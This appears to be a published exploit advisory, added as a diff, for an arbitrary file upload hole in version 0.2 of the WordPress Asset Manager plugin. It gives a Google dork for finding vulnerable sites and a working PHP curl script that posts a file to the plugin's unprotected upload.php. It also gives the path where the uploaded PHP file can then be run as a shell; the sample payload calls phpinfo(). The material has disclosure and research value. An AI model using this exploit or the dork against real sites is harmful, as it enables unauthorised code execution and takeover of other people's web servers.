@@ -1,0 +1,38 @@
+##################################################
+# Description : Wordpress Plugins - Asset Manager Shell Upload Vulnerability
+# Version : 0.2
+# Link : http://wordpress.org/extend/plugins/asset-manager/
+# Plugins : http://downloads.wordpress.org/plugin/asset-manager.0.2.zip
+# Date : 26-05-2012
+# Google Dork : inurl:/wp-content/plugins/asset-manager/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/asset-manager/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/uploads/assets/temp/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
+
